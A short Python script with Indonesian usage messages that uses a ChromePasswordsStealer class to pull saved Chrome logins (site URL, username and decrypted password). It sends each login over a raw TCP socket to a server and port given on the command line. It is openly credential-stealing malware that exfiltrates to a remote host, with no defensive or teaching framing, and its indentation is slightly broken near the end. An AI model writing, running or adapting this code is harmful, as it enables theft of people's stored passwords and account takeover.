from ChromePasswordsStealer import ChromePasswordsStealer
import socket
import sys
from io import StringIO

original_stdout = sys.stdout
sys.stdout = StringIO()
sys.stdout = original_stdout

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

if len(sys.argv) != 3:
   print("Penggunaan:  \npython3 bahan.py [server] [port]")
   sys.exit(1)
else:
   server = sys.argv[1]
   port = int(sys.argv[2])
   try:
       s.connect((server, port))
       do = ChromePasswordsStealer("passwords", True)
       do.get_database_cursor()
       do.get_key()

       for url, username, password in do.get_credentials():
           data = f"{url}, {username}, {password}\n"
           s.send(data.encode())

       s.close()
    except ConnectionRefusedError:
        print("Server penerima belum dihidupkan\n")
